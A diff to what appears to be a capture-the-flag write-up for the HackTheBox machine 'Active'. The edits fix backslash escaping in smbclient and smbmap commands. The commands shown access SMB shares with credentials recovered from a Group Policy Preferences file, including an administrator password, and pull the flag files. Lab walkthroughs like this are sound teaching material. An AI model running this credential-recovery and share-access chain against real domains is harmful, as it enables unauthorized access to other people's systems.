@@ -309,7 +309,7 @@ SMB1 disabled -- no workgroup available</div>
 </ul>
 
 <p>There I found some files under the Replication share.</p>
-<div class="terminal-box">smbclient -N \\10.10.10.100\\Replication</div>
+<div class="terminal-box">smbclient -N \\10.10.10.100\Replication</div>
 
 <p>The most important file for me was <code>Groups.xml</code>, which is in this path:</p>
 <p><code>\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups</code></p>
@@ -370,7 +370,7 @@ Raw decrypted bytes: b' \x027\x8d\xa4%@\x17Ca\x80
 <p>Now I can log in and get the user flag via the SMB shares.</p>
 <div class="terminal-box">smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18</div>
 <p>Or with this command:</p>
-<div class="terminal-box">smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+<div class="terminal-box">smbclient //10.10.10.100/Users -U active.htb\SVC_TGS%GPPstillStandingStrong2k18
 
 smb: \SVC_TGS\desktop\&gt; get user.txt</div>
 
@@ -415,7 +415,7 @@ Ticketmaster1968</div>
 
 <h2 id="privilege-escalation-second-way">4. Privilege Escalation - Second Way</h2>
 <p>We can use <code>smbclient</code> to list the shares, check which permissions we have, and get the flag:</p>
-<div class="terminal-box">smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
+<div class="terminal-box">smbclient //10.10.10.100/C$ -U active.htb\administrator%Ticketmaster1968
 
 smb: \&gt; get \users\administrator\desktop\root.txt</div>
 
